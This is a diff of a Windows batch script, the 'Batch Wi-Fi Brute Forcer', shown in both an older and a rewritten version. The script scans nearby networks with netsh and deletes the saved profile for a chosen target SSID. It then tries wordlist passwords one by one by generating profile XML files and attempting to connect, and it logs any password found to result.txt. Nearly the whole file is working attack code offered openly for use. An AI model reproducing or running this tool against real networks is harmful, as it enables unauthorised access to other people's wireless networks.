@@ -1,1357 +1,665 @@
 @echo off
-        if not exist BF_Files\ (
-	echo The BF_Files folder could not be found.
-	echo Without it, the program cannot run.
-	echo It may have been renamed, moved or deleted.
-	echo To fix this issue, name the folder back, move it back or reinstall the program from GitHub.
-	pause
-	exit
-	)
-	
-	set allowed_char_list="ABCDEFGHIJKLMNOPRSTUVYZWXQabcdefghijklmnoprstuvyzwxq0123456789-_"
-	title The WI-FI Brute Forcer - Developed By TUX
-	set /a attempt=1
-	cls
-	set targetwifi=No WI-FI Selected
-	set interface_admin_state=Not Selected
-	set interface_registry_location=Not Selected
-	set interface_description=Not Selected
-	set interface_id=Not Selected
-	set interface_mac=Not Selected
-	set interface_state=notdefined
-	setlocal enabledelayedexpansion
-	mode con: cols=130 lines=45
-	color 0f
-	set program_path=%0
-	set program_directory=!program_path:~1,-17!
-	set program_drive=!program_directory:~0,2!
-	%program_drive%
-	cd %program_directory%
-	
-	:check_Permissions
-	net session >nul 2>&1
-	if %errorLevel% == 0 (
-		set privilege_level=administrator
-		cd !current_directory!
-		cd BF_Files
-		del attempt.xml >nul
-		del infogate.xml >nul
-		cls
+:: Batch Wi-Fi Brute Forcer - Developed By TechnicalUserX
+:: Please refer to https://github.com/TechnicalUserX for more projects
 
-	)else (
-		set privilege_level=local
-		cd BF_Files
-		del attempt.xml >nul
-		del infogate.xml >nul
-		cls
-	)
-	
-	
-	
-	
-	
-	
-	
-	
-	call :interface_detection
-	
-	
-	if !interface_number!==1 (
-	echo.
-	call colorchar.exe /0b " Interface Detection"
-	echo.
-	echo.
-	call colorchar.exe /0e " Only '1' Interface Found!"
-	echo.
-	echo.
-	call colorchar.exe /0f " !interface_1_description!("
-	call colorchar.exe /09 "!interface_1_mac!"
-	call colorchar.exe /0f ")"
-	echo.
-	echo.
-	echo  Making !interface_1_description! the default Interface...
-	set interface_id=!interface_1_id!
-	set interface_description=!interface_1_description!
-	set interface_mac=!interface_1_mac!
-	timeout /t 3 >nul
+:: This program is created to be proof of concept that it is possible
+:: to write a working Wi-Fi attack tool with Batchfiles since there 
+:: are countless examples on the internet that claims to be legit
+:: hacking tools, working on CMD. While this tool does not claim
+:: %100 success ratio, it is still working if target Wi-Fi has
+:: weak password. :)
+
+:: There is already a wordlist file in the repository but you are free
+:: to use your own wordlists.
+
+cls
+setlocal enabledelayedexpansion
+title Batch Wi-Fi Brute Forcer
+color 0f
+:: Enable UTF-8
+chcp 65001>nul
+cd /D %~dp0
+
+if not exist importwifi.xml (
+    echo.
+    call :color_echo . red "importwifi.xml does not exists, exiting..."
+    timeout /t 3 >nul
+    exit
+)
+
+
+:: Interface Variables
+set interface_number=0
+set interface_mac=not_defined
+set interface_id=not_defined
+set interface_state=not_defined
+set interface_description=not_defined
+
+set wifi_target=not_defined
+
+set wordlist_file=not_defined
+
+
+:program_entry
+    call :interface_init
+    call :mainmenu
+goto :eof
+
+
+:interface_detection
+    cls
+    echo.
+    call :color_echo . yellow "Detecting interfaces..."
+    set interface_temp_index=-1
+    set interface_number=0
+
+    for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
+        if "%%c"=="Wi-Fi" (
+            set /a interface_temp_index=!interface_temp_index!+1
+            if "%%d"=="" (
+                set interface[!interface_temp_index!]_id=%%c
+            ) else (
+                set interface[!interface_temp_index!]_id=%%c %%d
+            )
+        )
+        if %%a==Description (
+            set interface[!interface_temp_index!]_description=%%c %%d
+        )
+        if %%a==Physical (
+            set interface[!interface_temp_index!]_mac=%%d
+        )	
+
+
+    )
+
+    set /a interface_number=!interface_temp_index!+1
+    timeout /t 2 >nul
+    cls
+goto :eof
+
+
+:color_echo 
+
+    :: Check if the first 2 arguments are empty, cause they are needed for background/foreground information
+    :: The 3rd argument is not that important because it can be an empty string
+    if "%~1" equ "" (
+        goto :eof
+    )
+    if "%~2" equ "" (
+        goto :eof
+    )
+
+    :: Background color; if invalid, no action
+    if "%~1" equ "black" (
+        <nul set /p=[40m
+    )
+
+    if "%~1" equ "red" (
+        <nul set /p=[41m
+    )
+
+    if "%~1" equ "green" (
+        <nul set /p=[42m
+    )
+
+    if "%~1" equ "yellow" (
+        <nul set /p=[43m
+    )
+
+    if "%~1" equ "blue" (
+        <nul set /p=[44m
+    )
+
+    if "%~1" equ "magenta" (
+        <nul set /p=[45m
+    )
+
+    if "%~1" equ "cyan" (
+        <nul set /p=[46m
+    )
+
+    if "%~1" equ "white" (
+        <nul set /p=[47m
+    )
+
+    :: Foreground color; if invalid, no action
+
+    if "%~2" equ "black" (
+        <nul set /p=[30m
+    )
+
+    if "%~2" equ "red" (
+        <nul set /p=[31m
+    )
+
+    if "%~2" equ "green" (
+        <nul set /p=[32m
+    )
+
+    if "%~2" equ "yellow" (
+        <nul set /p=[33m
+    )
+
+    if "%~2" equ "blue" (
+        <nul set /p=[34m
+    )
+
+    if "%~2" equ "magenta" (
+        <nul set /p=[35m
+    )
+
+    if "%~2" equ "cyan" (
+        <nul set /p=[36m
+    )
+
+    if "%~2" equ "white" (
+        <nul set /p=[37m
+    )
+
+    <nul set /p="%~3"
+
+    <nul set /p=[0m
+goto :eof
+
+
+:interface_init
+    cls
+    :: Interface detection and selection
+    call :interface_detection
+    echo.
+    call :color_echo . cyan " Interface Init"
+    echo.
+    echo.
+	if !interface_number! equ 1 (
+
+        call :color_echo . yellow " Only '1' Interface Found!"
+        echo.
+        echo.
+        call :color_echo . white " !interface[0]_description!("
+        call :color_echo . blue "!interface[0]_mac!"
+        call :color_echo . white ")"
+        echo.
+        echo.
+        echo Making !interface[0]_description! the default interface...
+        set interface_id=!interface[0]_id!
+        set interface_description=!interface[0]_description!
+        set interface_mac=!interface[0]_mac!
+        timeout /t 3 >nul
 	)
 	
 	if !interface_number! gtr 1 (
-	echo.
-	call colorchar.exe /0b " Interface Detection"
-	echo.
-	echo.
-	call colorchar.exe /0e " Multiple '!interface_number!' Interfaces Found!"
-	echo.
-	timeout /t 3 >nul
-	call :interface_selection
-	
+
+        call :color_echo . yellow " Multiple '!interface_number!' Interfaces Found!"
+        echo.
+        timeout /t 3 >nul
+        call :interface_selection
+        
 	)
 	
 	if !interface_number!==0 (
-	echo.
-	call colorchar.exe /0b " Interface Detection"	
-	echo.
-	echo.
-	call colorchar.exe /0e " WARNING"
-	echo.
-	echo  No interfaces found on this device^^!
-	echo.
-	echo  Press any key to continue...
-	timeout /t 5 >nul
-	cls
-	)
-	
-	
-	
-	goto :main
-	
-	
-	
-	
-	:main
-	set mainmenuchoice=
-	cls
-	echo.
-	echo  [------------------------------------------------------------------------------------------------------]
-	echo.
-	echo                     \_                              _/
-	echo                       \       _______              /
-	echo                             _/       \______
-	echo              \_          __^|_________^|^|     ^|            _/
-	echo                \        /             \_    /_____      /         (                             )
-	echo                        /                \_ /      /              .                               .
-	echo                       /                   \_     /____          .                                 .
-	echo                     _/       __             \   /      \       .       (                   )       .
-	echo                    ^|           \____        / /        \      .      .                     .      .
-	echo                    ^|        ^\_      \______/__\       _^|     (      .      (    O    )      .      )
-	echo                     ^|                           ^\____/ ^|      ^.      .          ^|          ^.      .
-	echo                     ^|_                   /             /      .       (         ^|         )       .
-	echo                       \           /     /             /        .              // \\              .
-	echo                        \          ^|     ^|            /          .            //   \\            .
-	echo                         \         \     ^|           /            (          //_____\\          )
-	echo                          \_        \   /           /                       //       \\
-	echo                            ^|                      /                       //_________\\
-	echo                            ^|__                ___/                       //           \\
-	echo                           /                    ^|                        //_____________\\
-	echo                          /                     ^|                       //               \\
-	echo                         /                      /
-	echo                        /                      /
-	echo  [------------------------------------------------------------------------------------------------------]
-	call colorchar.exe /0b "                              THE BATCH WI-FI BRUTE FORCER (Version 1.2.0)"
-	echo.
-	call colorchar.exe /0e "                                           Developed By TUX"
-	echo.
-	echo  [------------------------------------------------------------------------------------------------------]
-	echo.
-	
-	
-	
-	call colorchar.exe /0b "   Target - " 
-	echo !targetwifi!
-	call colorchar.exe /0b "   Interface - "
-	echo !interface_description!
-	echo.
-	echo    Type "help" for more info
-	
-	call colorbox.exe /0F 1 29 104 35
-	echo.
-	echo.
-	call :userinput
-	set /p mainmenuchoice=
-	
-	if !mainmenuchoice!==exit (
-	exit
-	)
-	
 
-	if !mainmenuchoice!==test (
-	cls
-	echo.
-	echo  ID !interface_id!
-	echo  MAC !interface_mac!
-	echo  DESC !interface_description!
-	echo.
-	pause
-	cls
-	goto :main
+        call :color_echo . yellow "WARNING"
+        echo.
+        echo No interfaces found on this device^^!
+        echo.
+        set interface_id=not_defined
+        set interface_description=not_defined
+        set interface_mac=not_defined
+        pause
+        cls
 	)
-	
-	
-	
-	if !mainmenuchoice!==help (
+
+goto :eof
+
+
+:interface_selection
+    cls
+    echo.
+    call :color_echo . cyan "Interface Selection"
+    echo.
+    echo.
+    set wifi_target=not_defined
+    set /a interface_number_zero_indexed=!interface_number!-1
+    set /a cancel_index=!interface_number_zero_indexed!+1
+
+    for /l %%a in ( 0, 1, !interface_number_zero_indexed! ) do (
+        call :color_echo . magenta "%%a) "
+        call :color_echo . white " !interface[%%a]_description!("
+        call :color_echo . blue "!interface[%%a]_mac!"
+        call :color_echo . white ")"
+        echo.
+    )
+    call :color_echo
+    call :color_echo . red "!cancel_index!) Cancel"
+    echo.
+    echo.
+
+    call :program_prompt
+
+    if !program_prompt_input! leq !interface_number_zero_indexed! (
+        if !program_prompt_input! geq 0 (
+
+        echo Making !interface[!program_prompt_input!]_description! the interface...
+        set interface_id=!interface[%program_prompt_input%]_id!
+        set interface_description=!interface[%program_prompt_input%]_description!
+        set interface_mac=!interface[%program_prompt_input%]_mac!
+        ) else (
+            if "!program_prompt_input!" equ "!cancel_index!" (
+                set interface_id=not_defined
+                set interface_description=not_defined
+                set interface_mac=not_defined
+                goto :eof
+            ) else (
+                call :program_prompt_invalid_input
+                goto :interface_selection
+            )
+        )
+    ) else (
+
+        if !program_prompt_input! equ !cancel_index! (
+            set interface_id=not_defined
+            set interface_description=not_defined
+            set interface_mac=not_defined
+            goto :eof
+        ) else (
+            call :program_prompt_invalid_input
+            goto :interface_selection
+        )
+
+
+    )
+
+
+goto :eof
+
+
+:program_prompt
+    call :color_echo . green " bruteforcer"
+    call :color_echo . white "$ "
+    set /p program_prompt_input=
+goto :eof
+
+
+:program_prompt_invalid_input
+    call :color_echo . red "Invalid input"
+    timeout /t 3 >nul
+goto :eof
+
+
+:mainmenu
+    cls
+    echo.
+    call :color_echo . cyan "Batch Wi-Fi Brute Forcer"
+    echo.
+    echo.
+    call :color_echo . magenta "   Interface : "
+    call :color_echo . white "!interface_description!("
+    call :color_echo . blue "!interface_mac!"
+    call :color_echo . white ") "
+    echo.
+    call :color_echo . magenta "   Target    : "
+    call :color_echo . white "!wifi_target!"
+    echo.
+    call :color_echo . magenta "   Wordlist  : "
+    call :color_echo . white "!wordlist_file!"
+    echo.
+    echo.
+    call :program_prompt
+    echo.
+
+    if "!program_prompt_input!" equ "scan" (
+        call :scan
+        goto :mainmenu
+    )
+
+    if "!program_prompt_input!" equ "interface" (
+        call :interface_init
+        goto :mainmenu
+    )
+
+    if "!program_prompt_input!" equ "attack" (
+        call :attack
+        goto :mainmenu
+    )
+
+    if "!program_prompt_input!" equ "help" (
+        call :help
+        goto :mainmenu
+    )
+
+
+    if "!program_prompt_input!" equ "wordlist" (
+        call :wordlist
+        goto :mainmenu
+    )
+
+    if "!program_prompt_input!" equ "exit" (
+        exit
+    )
+
+call :program_prompt_invalid_input
+goto :mainmenu
+
+
+:scan
+    cls
+
+    if "!interface_id!" equ "not_defined" (
+        call :color_echo . red "You have to select an interface to perform scan"
+        set wifi_target=not_defined
+        echo.
+        echo.
+        pause
+        goto :eof
+    )
+
+
+    echo.
+    call :color_echo . cyan "Possible Wi-Fi Networks"
+    echo.
+    echo.
+    :: wifi[] is the array for possible wifis
+    set wifi_index=-1
+    set cancel_index=0
+    for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
+
+        if "%%a" equ "SSID" (
+            set /a wifi_index=!wifi_index!+1
+            set wifi[!wifi_index!]_ssid=%%d
+        )
+
+        if "%%a" equ "Signal" (
+            set wifi[!wifi_index!]_signal=%%c
+        )
+
+    )
+    set /a cancel_index=!wifi_index!+1
+    
+    for /l %%a in ( 0, 1, !wifi_index! ) do (
+
+        call :color_echo . magenta "%%a) "
+
+        if "!wifi[%%a]_ssid!" equ "" (
+            call :color_echo . red "No Name "
+        ) else (
+            call :color_echo . white "!wifi[%%a]_ssid! "
+        )
+
+
+        call :color_echo . blue "!wifi[%%a]_signal!"
+        echo.
+    )
+
+
+    call :color_echo . red "!cancel_index!) Cancel"
+    echo.
+    echo.
+
+    call :program_prompt
+    echo.
+
+    if "!program_prompt_input!" equ "!cancel_index!" (
+        goto :eof
+    )
+    if !program_prompt_input! leq !wifi_index! (
+            if !program_prompt_input! geq 0 (
+            set "wifi_target=!wifi[%program_prompt_input%]_ssid!"
+            goto :eof
+        )
+    )
+
+    call :program_prompt_invalid_input
+
+goto :eof
+
+
+:attack
+
+    if "!wordlist_file!" equ "not_defined" (
+        cls
+        echo.
+        call :color_echo . red "Please provide a wordlist..."
+        echo.
+        echo.
+        pause
+        goto :eof
+    )
+
+
+    if "!wifi_target!" equ "not_defined" (
+        cls
+        echo.
+        call :color_echo . red "Please select a target after scanning..."
+        echo.
+        echo.
+        pause
+        goto :eof
+    )
+
+    if "!interface_id!" equ "not_defined" (
+        cls
+        echo.
+        call :color_echo . red "Please select an interface..."
+        echo.
+        echo.
+        pause
+        goto :eof
+    )
+
+    cls
+    echo.
+    call :color_echo . yellow "WARNING"
+    echo.
+    echo.
+    echo If you connected to a network with the same name as this: "!wifi_target!",
+    echo its profile will be deleted.
+    echo.
+    echo This app might not find the correct password if the signal strength
+    echo is too low. Remember, this is an online attack. Expect slow attempts.
+    echo.
+    pause
+    netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
+    cls
+
+    :: Prepare ssid import
+    del /Q /F importwifi_prepared.xml 2>nul
+    for /f "tokens=*" %%a in ( importwifi.xml ) do (
+        set variable=%%a
+        echo !variable:changethistitle=%wifi_target%!>>importwifi_prepared.xml
+    )
+    set password_count=0
+    for /f "tokens=1" %%a in ( !wordlist_file! ) do (
+        set /a password_count=!password_count!+1
+        set password=%%a
+		set temp_auth_num=0
+        call :prepare_attempt "!password!"
+        netsh wlan add profile filename=importwifi_attempt.xml >nul
+        cls
+        echo.
+        call :color_echo . cyan "Attacking"
+        echo.
+        echo.
+        call :color_echo . magenta "Target Wi-Fi   : "
+        call :color_echo . white "!wifi_target!"
+        echo.
+        call :color_echo . magenta "Password Count : "
+        call :color_echo . white "!password_count!"
+        echo.
+        echo.
+        call :color_echo . blue "Trying password -> "
+        call :color_echo . yellow "!password!"
+        echo.
+        echo.
+        call :color_echo . cyan "Attempts: "
+        echo.
+		netsh wlan connect name=!wifi_target! interface="!interface_id!" >nul
+
+
+
+        for /l %%a in ( 1, 1, 20 ) do (
+            call :interface_find_state
+
+            if "!interface_state!" equ "connecting" (
+                goto :attack_success
+            )
+
+            if "!interface_state!" equ "connected" (
+                goto :attack_success
+            )
+            
+
+        )
+
+        del /Q /F importwifi_attempt.xml 2>nul
+    )
+
+    :attack_failure
+        del /Q /F importwifi_prepared.xml 2>nul
+        del /Q /F importwifi_attempt.xml 2>nul
+        cls
+        echo.
+        call :color_echo . red "Could not find the password"
+        echo.
+        echo.
+        netsh wlan delete profile !wifi_target! interface="!interface_id!">nul
+        pause
+    goto :eof
+
+    :attack_success
+        del /Q /F importwifi_prepared.xml 2>nul
+        del /Q /F importwifi_attempt.xml 2>nul
+        cls
+        echo.
+        call :color_echo . green "Found the password"
+        echo.
+        echo.
+        echo.
+        call :color_echo . magenta "Target     : "
+        call :color_echo . white "!wifi_target!"
+        echo.
+        call :color_echo . magenta "Password   : "
+        call :color_echo . white "!password!"
+        echo.
+        call :color_echo . magenta "At attempt : "
+        call :color_echo . white "!password_count!"
+        echo.
+        echo.
+
+        echo Batch Wi-Fi Brute Forcer Result>>result.txt
+        echo Target     : !wifi_target!>>result.txt
+        echo At attempt : !password_count!>>result.txt
+        echo Password   : !password!>>result.txt
+        echo.>>result.txt
+        pause
+    goto :eof
+
+goto :eof
+
+
+
+
+:help
 		cls
 		echo.
-		call colorchar.exe /0b " Commands "
+		call :color_echo . cyan "Commands"
 		echo.
 		echo.
-		echo  - help             : Displays this area
-		echo  - wifiscan         : Performs a WI-FI scan
+		echo  - help             : Displays this page
+        echo  - wordlist         : Provide a wordlist file
+		echo  - scan             : Performs a WI-FI scan
 		echo  - interface        : Open Interface Management
 		echo  - attack           : Attacks on selected WI-FI
 		echo.
 		echo  For more informaton, please read "README.md".
 		echo.
-		echo.
 		echo  Other projects of TUX:
-		echo  "https://www.technicaluserx.wordpress.com"
+		echo  https://www.technicaluserx.wordpress.com
+        echo  https://github.com/TechnicalUserX
 		echo.
-		echo  This project's UI was made possible with TheBATeam group plugins.
-		echo  TheBATeam project has ended, the website is closed
-		echo  New address is "https://www.batch-man.com/"
 		echo.
-		echo  Press any key to continue...
+		echo Press any key to continue...
 		pause >nul
-		cls
-		goto :main
-	)
-	
-	
-	if !mainmenuchoice!==interface (
-		cls
-		call :interface_management
-		cls
-		goto :main
-	)
-	
-	
-	
-	
-	
-	if !mainmenuchoice!==wifiscan (
-		del infogate.xml
-		call :wifiscan
-		call :exporter !targetwifi!
-		goto :main
-	)
-	
 
-	
-	
-	
-	
-	if !mainmenuchoice!==attack (
-	set /a attempt=1
-	
-		if "!targetwifi!"=="No WI-FI Selected" (
-			call colorchar.exe /0c " Please select a target WI-FI..."
-			echo.
-			echo.
-			echo  Press any key to continue...
-			timeout /t 5 >nul
-			cls
-			set mainmenuchoice=
-			goto :main
-		)
-		
-		if "!interface_description!"=="Not Selected" (
-			call colorchar.exe /0c " Please select an interface..."
-			echo.
-			echo.
-			echo  Press any key to continue...
-			timeout /t 5 >nul
-			cls
-			set mainmenuchoice=
-			goto :main
-		)		
-		
-		
-		
-		cls
-		echo.
-		call colorchar.exe /0e " WARNING"
-		echo.
-		echo  If you connected to a network with the same name as this: "!targetwifi!",
-		echo  its profile will be deleted.
-		echo.
-		echo.
-		echo  This app might not find the correct password if the signal strength
-		echo  is too low!
-		echo.
-		echo  A good USB WI-FI antenna is recommended.
-		echo.
-		echo  Press any key to continue...
-		pause >nul
-		netsh wlan delete profile !targetwifi! interface="!interface_id!"
-		cls
-		echo.
-		call colorchar.exe /0b " Processing passlist..."
-		echo.
-		set /a password_number=0
-		for /f "tokens=1" %%a in ( passlist.txt ) do (
-			set /a password_number=!password_number!+1
-		)
-		cls
-		
-		
-		
-		
-	
-	
-	for /f "tokens=1" %%a in ( passlist.txt ) do (
-		set temppass=%%a
-		set temp_auth_num=0
-		call :finalfunction !temppass!
-		netsh wlan add profile filename=attempt.xml >nul
-		call :calc_percentage "!attempt!" "!password_number!"
-		cls
-		echo  [==================================================]
-		call colorchar.exe /07 "  Target WI-FI: "
-		echo !targetwifi!
-		call colorchar.exe /07 "  Total Passwords: "
-		call colorchar.exe /0f "!password_number!"
-		echo.
-		call colorchar.exe /07 "  Percentage: "
-		echo  %% !pass_percentage!	
-		echo  [==================================================]
-		call colorchar.exe /0b "  Trying the password -" 
-		echo  !temppass!
-		echo  [==================================================]
-		call colorchar.exe /0e "  Attempt -"
-		echo  !attempt!
-		echo  [==================================================]
-		echo   Current State:
-		netsh wlan connect name=!targetwifi! interface="!interface_id!" >nul
-
-	
-		
-	
-		
-		for /l %%a in ( 1, 1, 20) do (
-			call :find_connection_state
-				if !interface_state!==connecting (
-				del infogate.xml
-				del attempt.xml
-				goto :show_result
-			)
-				if !interface_state!==connected (
-				del infogate.xml
-				del attempt.xml
-				goto :show_result
-			)
-		
-		)
-		
-		
-	
-
-	
-	
-	
-	
-	
-	
-	
-	
-		
-		set /a attempt=!attempt!+1
-		del attempt.xml
-	)
-	
-	
-		:Not_Found
-		cls
-		echo.
-		echo  [==================================================]
-		call colorchar.exe /0c "  Password not found. :'("
-		echo.
-		echo  [==================================================]
-		echo.
-		echo  Press any key to continue...
-		pause >nul
-		cls
-	
-	goto :main
-	)
-
-
-	call colorchar.exe /0c " Invalid input"
-	timeout /t 2 >nul
-	goto :main
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	:wifiscan
-	set /a keynumber=
-	set choice=
-	cls
-	
-		if "!interface_id!"=="Not Selected" (
-		echo.
-		call colorchar.exe /0c " You have to select an interface to perform a scan..."
-		echo.
-		echo.
-		echo  Press any key to continue...
-		timeout /t 5 >nul
-		cls
-		goto :main
-		
-		)
-	
-	
-		if !interface_number!==0 (
-		echo.
-		call colorchar.exe /0c " You have at least '1' WI-FI interface to perform a scan..."
-		echo.
-		echo.
-		echo  Press any key to continue...
-		timeout /t 5 >nul
-		cls
-		goto :main
-		
-		)
-	
-	
-		:test_connection
-		set interface_state_check=false
-	
-			for /f "tokens=1-5" %%a in ('netsh wlan show interfaces ^| findstr /L "Name State"') do ( 
-			
-			if !interface_state_check!==true (
-				set interface_state=%%c
-				goto :skip_test_connection
-			)
-			
-			if "!interface_id!"=="%%c" (
-				set interface_state_check=true
-			)
-			
-			if "!interface_id!"=="%%c %%d" (
-				set interface_state_check=true
-			)
-		)
-	
-		:skip_test_connection
-		if !interface_state!==connected (
-			echo.
-			echo  Disconnecting from current network...
-			netsh wlan disconnect interface="!interface_id!" >nul
-			timeout /t 3 >nul
-		
-		)
-
-
-	
-
-		
-		:skip_disconnection
-		cls
-		
-		del wifilist.txt
-		cls
-		set /a keynumber=0
-		echo.
-		call colorchar.exe /0b " Possible WIFI Networks"
-		echo.
-		echo.
-		call colorchar.exe /0f " Using "
-		call colorchar.exe /0e "!interface_description!"
-		call colorchar.exe /0f " for scanning..."
-		echo.
-		echo  Low Signal Strength networks are not recommended
-		echo.
-		for /f "tokens=1-4" %%a in ('netsh wlan show networks mode^=bssid interface^="!interface_id!" ') do (
-
-		
-			if %%a==SSID (
-				set /a keynumber=!keynumber! + 1
-				set current_ssid=%%d
-
-				call :character_finder_2 "!current_ssid!"
-
-			)
-
-			if %%a==Signal (
-			set current_signal==%%c
-			
-			
-				if !text_available!==true (
-					call colorchar.exe /08 " !keynumber! - "
-					call colorchar.exe /0f "!current_ssid!"
-					call colorchar.exe /03 " - !current_signal:~1,5!"
-					echo.
-					
-					echo !keynumber! - !current_ssid! - !current_signal:~1,4!>>wifilist.txt
-					if !keynumber!==24 (
-						goto :skip_scan
-					)
-
-				)else (
-				call colorchar.exe /0e " !keynumber! - "
-				call colorchar.exe /0c "Unsupported Char"
-				echo.
-				echo !keynumber! - Unsupported Char>>wifilist.txt
-					if !keynumber!==24 (
-						goto :skip_scan
-					)
-				
-				)
-
-			
-			)
+goto :eof
 
 
 
-
-		)
-		:skip_scan
-		set /a keynumber=!keynumber!+1
-		set choice_cancel=!keynumber!
-		call colorchar.exe /08 " !keynumber! - "
-		call colorchar.exe /07 "Cancel Selection"
-		
-		
-		echo.
-		echo.
-		call colorchar.exe /0b " Please choice a wifi or cancel(1-!keynumber!)"
-		echo.
-		set choice=
-		call colorchar.exe /0e " wifi"
-		call colorchar.exe /0f "@"
-		call colorchar.exe /08 "select"
-		call colorchar.exe /0f "[]-"
-		set /p choice=
-	
-	
-	
-
-		
-		if !choice!==!choice_cancel! (
-		set choice=
-		set choice_cancel=
-		cls
-		goto :main
-		)
-	
+:wordlist
+    cls
+    echo.
+    call :color_echo . cyan "Wordlist"
+    echo.
+    echo.
+    echo Please provide a valid wordlist
+    echo.
+    call :program_prompt
+    echo.
+    if not exist !program_prompt_input! (
+        call :color_echo . red "Provided path does not resolve to a file"
+        timeout /t 2 >nul
+    ) else (
+        set wordlist_file=!program_prompt_input!
+        goto :eof
+    )
+goto :eof
 
 
-		if !choice! gtr !keynumber! ( 
-			call colorchar.exe /0c " Invalid input"
-			echo.
-			timeout /t 2 >nul
-			cls
-			set choice=
-			goto :skip_disconnection
-		)
-		
-		if !choice! lss 1 ( 
-			call colorchar.exe /0c " Invalid input"
-			echo.
-			timeout /t 2 >nul
-			cls
-			set choice=
-			goto :skip_disconnection
-		)
-		
-		for /f "tokens=1-5" %%a in ( wifilist.txt ) do (
-		
-		if %%a==!choice! (
-				set temp_signal_strength=%%e
-				set signal_strength=!temp_signal_strength:~0,-1!
-				if %%c==Unsupported (
-					call colorchar.exe /0c " This SSID is unsupported..."
-					timeout /t 3 >nul
-					cls
-					goto :skip_disconnection
-				)else (
-					
-					if !signal_strength! lss 50 (
-						echo.
-						call colorchar.exe /0c " Low signal[!signal_strength!] strengths are not recommended."
-						echo.
-						echo  Do you want to continue anyway?[Y-N]
-						set choice=
-						call colorchar.exe /0e " continue"
-						call colorchar.exe /0f "@"
-						call colorchar.exe /08 "select"
-						call colorchar.exe /0f "[]-"
-						set /p choice=
-							if !choice!==N (
-								cls
-								goto :skip_disconnection
-							)
-							if !choice!==Y (
-								set targetwifi=%%c
-								goto :skip_target_wifi
-							)
-							call colorchar.exe /0c " Invalid input"
-							echo.
-							timeout /t 2 >nul
-							cls
-							set choice=
-							goto :skip_disconnection			
-							
-					)
-					
-				
-					
-					set targetwifi=%%c
-					:skip_target_wifi
-					echo Test >nul
-					
-				)
-					
-				
-			)
-		
-		
-		)
-		
-		del wifilist.txt
-		cls
-		goto :eof
-	
-	
-	
-	
-	
-	
-	:finalfunction
-		for /f "tokens=*" %%x in ( infogate.xml ) do (
+
+:prepare_attempt
+	for /f "tokens=*" %%x in ( importwifi_prepared.xml ) do (
 		set code=%%x
-		echo !code:changethiskey=%1!>>attempt.xml
-		)
-	goto :eof
-	
-	
-	
-	
-	
-	:exporter
-		for /f "tokens=*" %%a in ( importwifi.xml ) do (
-		set variable=%%a
-		echo !variable:changethistitle=%1!>>infogate.xml
-	)
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	
-	:userinput
-	call colorchar.exe /0a " !privilege_level!"
-	call colorchar.exe /0f "@"
-	call colorchar.exe /08 "user"
-	call colorchar.exe /0f "[]-"
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	:character_finder_2
-		set text_available=true
-		call :create_string check_name "%~1"
-		set /a check_name_length=!check_name_length!-1	
-		for /l %%a in ( 0,1,!check_name_length!) do (
-			set current_character=!check_name:~%%a,1!
+		echo !code:changethiskey=%~1!>>importwifi_attempt.xml
+    )
+goto :eof
 
-			call :character_finder "!allowed_char_list!" "!current_character!"	
-			if !character_found!==false (	
-				set text_available=false
-				goto :eof
-			)
-			
-		)
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	:character_finder
-	set character_found=false
-	call :create_string string_find "%~1"
-	set /a string_find_length=!string_find_length! - 1
-	for /l %%a in ( 0, 1, !string_find_length! ) do (
-		set character=!string_find:~%%a,1!
-		if "!character!"=="%~2" (
-		set character_found=true
-		goto :eof
-		)
-	)
-	goto :eof
-	
-	
-	
-	
-	
-	
-	
-	:create_string
-		set /a takeaway=4
-		set string=%~2
-		echo %string%>var.txt
-		
-	for /f "useback tokens=*" %%a in ( '%string%' ) do (
-		if %string%==%%~a (
-			set /a takeaway=2
-		)
-		set string=%%~a 
-	)
-		set %~1=%string%
-		for %%I in ( var.txt ) do (
-			set /a %~1_length=%%~zI - %takeaway%
-		)
-		del var.txt
-	goto :eof
-	
-	
-	
-	
-	
-	
 
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	:interface_detection
-	set interface_number=0
-		
-		for /f "tokens=1-4" %%a in ('netsh wlan show interfaces ^| findstr /L "Name Description Physical"') do (
-			if "%%c"=="Wi-Fi" (
-			
-				if "%%d"=="" (
-				set /a interface_number=!interface_number!+1
-				set interface_!interface_number!_id=%%c
-				)else (
-				set /a interface_number=!interface_number!+1
-				set interface_!interface_number!_id=%%c %%d
-				)
-			
 
-			)
-			if %%a==Description (
-				set interface_!interface_number!_description=%%c %%d
-			)
-			if %%a==Physical (
-				set interface_!interface_number!_mac=%%d
-			)	
-		)
-	goto :eof
+:interface_find_state
+    set interface_state_check=false
 
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-
-	:interface_selection
-	set interface_choice=
-	del interfacelist.txt >nul
-	cls
-	echo.
-	set temp_interface_num_for_selection=1
-	call colorchar.exe /0b " Interface Selection"
-	echo.
-	echo.
-	for /l %%a in ( 1, 1, !interface_number! ) do (
-		
-		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
-		call colorchar.exe /0f "!interface_%%a_description!("
-		call colorchar.exe /08 "!interface_%%a_mac!"
-		call colorchar.exe /0f ")"
-		echo.
-		
-		echo !temp_interface_num_for_selection! - !interface_%%a_description! - !interface_%%a_mac!>>interfacelist.txt
-		
-		set /a temp_interface_num_for_selection=!temp_interface_num_for_selection!+1
-	)
-		call colorchar.exe /08 " !temp_interface_num_for_selection! - "
-		call colorchar.exe /07 "Cancel Selection"
-		echo.
-		echo !temp_interface_num_for_selection! - Cancel Selection>>interfacelist.txt
-		set choice_cancel=!temp_interface_num_for_selection!
-	
-	
-	
-	echo.
-	call colorchar.exe /0e " interface"
-	call colorchar.exe /0f "@"
-	call colorchar.exe /08 "select"
-	call colorchar.exe /0f "[]-"
-	set /p interface_choice=
-	
-		if !interface_choice!==!choice_cancel! (
-			goto :eof
-		)
-	
-		if !interface_choice! gtr !interface_number! ( 
-			call colorchar.exe /0c " Invalid input"
-			echo.
-			timeout /t 2 >nul
-			cls
-			set interface_choice=
-			goto :interface_selection
-		)
-	
-		if !interface_choice! lss 1 ( 
-			call colorchar.exe /0c " Invalid input"
-			echo.
-			timeout /t 2 >nul
-			cls
-			set interface_choice=
-			goto :interface_selection
-		)
-	
-	
